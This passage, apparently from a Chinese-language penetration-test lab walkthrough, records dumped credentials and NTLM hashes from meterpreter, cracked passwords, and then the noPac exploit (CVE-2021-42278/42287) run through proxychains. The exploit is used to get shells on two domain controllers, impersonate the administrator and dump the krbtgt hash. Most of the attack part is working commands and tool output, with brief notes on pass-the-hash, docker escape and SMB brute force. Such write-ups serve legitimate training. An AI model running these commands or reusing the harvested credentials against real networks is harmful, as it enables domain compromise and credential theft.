         * Password : *TWd&U<_HmU- 9O*'%$qBwkI?;("u $YVsgqo D'jUOR[b$<"d(4.nwOFf(UyUG.q7@c.xz+=KcHCr+,%F7>i?=((QLz8#:b/IXA@!Sc(gH:vdmopQmNfBzw
        ssp :
        credman :
```

发现一个域内用户：  test:QWEasd!@#999

```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
win7:1000:aad3b435b51404eeaad3b435b51404ee:f099c4a637f9b871487bbb03962f79b5:::
```

解密本机win7账号：  win7:admin555

<img src=".\图片\Snipaste_2023-05-21_13-49-46.png" alt="Snipaste_2023-05-21_13-49-46" style="zoom:80%;" />

# 域控

## 前置

 CVE-2021-42278 and CVE-2021-42287 攻击域控

前提条件：一个域内普通账号
影响版本：Windows基本全系列

工具地址：https://github.com/Ridter/noPac

还是在 win7 的 meterpreter 里开启代理，使攻击机能摸到 10.10.10.0/24 网段的域控，以下是用 cs 开的代理

## 第四台19server-ad01

检测：

```bash
└─# proxychains4 python3 scanner.py -use-ldap nasa/test:QWEasd\!@#999 -dc-ip 10.10.10.140
```

利用直接获取 shell

```bash
└─# proxychains4 python3 noPac.py -use-ldap nasa/test:QWEasd\!@#999 -dc-ip 10.10.10.140 -shell
```

<img src=".\图片\Snipaste_2023-05-21_14-38-59.png" alt="Snipaste_2023-05-21_14-38-59" style="zoom:80%;" />

获取域控票据

```bash
proxychains4 python3 noPac.py nasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.143 -dc-host AD02 --impersonate administrator -dump
```

<img src=".\图片\Snipaste_2023-05-21_14-48-35.png" alt="Snipaste_2023-05-21_14-48-35" style="zoom:80%;" />

```
proxychains4 python3 noPac.py  nasa.gov/test:'QWEasd!@#999' -dc-ip 10.10.10.143 -dc-host AD02 --impersonate administrator -dump -just-dc-user nasa/krbtgt
```



后续也可以用哈希传递或者票据传递

## 第五台19server-ad02

如上同理操作

```
proxychains4 python3 noPac.py -use-ldap nasa/test:QWEasd\!@#999 -dc-ip 10.10.10.143 -shell
```

<img src=".\图片\Snipaste_2023-05-21_14-57-48.png" alt="Snipaste_2023-05-21_14-57-48" style="zoom:80%;" />

# 总结

当一台主机同时存在本地账户和域账户时，本地账户无法使用域内的功能，因为本地账户未加入域

这里docker逃逸本质是挂载目录，把linux真实的目录挂载到容器内，可以对真实目录进行操作

可以爆破 smb 用户名与密码 


